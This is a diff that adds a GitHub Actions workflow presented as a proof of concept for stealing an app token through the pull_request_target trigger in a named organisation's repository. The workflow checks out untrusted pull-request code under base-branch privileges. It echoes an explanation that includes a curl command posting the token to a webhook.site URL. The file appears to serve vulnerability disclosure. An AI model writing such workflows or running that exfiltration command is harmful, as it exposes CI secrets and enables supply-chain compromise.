@@ -1,0 +1,57 @@
+name: "PoC - Token Exfiltration via pull_request_target"
+
+on:
+  # This trigger is key. It gives the workflow the base branch's permissions.
+  pull_request_target:
+    branches: [ "main" ]
+    types: [opened, synchronize]
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: "[1] Checkout Attacker-Controlled Code from PR"
+        # This step is the vulnerability. It runs with base branch privileges but checks out the untrusted PR code.
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+
+      - name: "[2] Install Dependencies (Potential Backdoor)"
+        # The PR could have modified package.json to install malicious packages.
+        run: |
+          echo "Simulating execution of untrusted code from the PR..."
+          cat ./malicious-script.sh 2>/dev/null || echo "No visible script, but the threat is real."
+
+      - name: "[3] Critical Impact: Steal the GitHub App Token"
+        # This is the core of the PoC, showing what an attacker *could* do.
+        env:
+          # The attacker's script accesses the privileged token generated in the original workflow.
+          # This token has the permissions of the GitHub App (IT_SO_CHK_APP_ID).
+          STOLEN_TOKEN: ${{ steps.generate-token.outputs.token }}
+        run: |
+          echo "=== PROOF OF CONCEPT: CRITICAL IMPACT ==="
+          echo ""
+          echo "1. VULNERABILITY TRIGGERED:"
+          echo "   The 'pull_request_target' event ran this workflow with the permissions"
+          echo "   of the base branch (main/InditexTech), NOT the forked PR."
+          echo ""
+          echo "2. ACCESS GRANTED:"
+          echo "   This job has access to:"
+          echo "   - Repository secrets (e.g., IT_SO_CHK_PKEY)"
+          echo "   - GitHub App Token with elevated privileges"
+          echo "   - Write permissions to the repository"
+          echo ""
+          echo "3. ATTACKER'S ACTION (Simulated):"
+          echo "   A real attacker could now exfiltrate the token or secrets."
+          echo "   Example command they would run:"
+          echo "   curl -X POST https://webhook.site/740991b8-d2b4-439a-b146-41d7a9e2bc86 -H 'Content-Type: application/json' -d '{\"token\":\"$STOLEN_TOKEN\"}'"
+          echo ""
+          echo "4. REAL-WORLD CONSEQUENCES:"
+          echo "   With this token, an attacker can:"
+          echo "   * Read/Monify ANY repository in the organization where the app is installed."
+          echo "   * Create issues, comments, or commits (potential supply chain attack)."
+          echo "   * Access other protected resources via the App's API permissions."
+          echo ""
+          echo "=== PoC Complete - Vulnerability Confirmed ==="
+          # The next line 'leaks' a fake token to the workflow log for demonstration.
+          echo "SIMULATED_EXFIL: Token 'ghs_xxxx...' would be sent to attacker server."
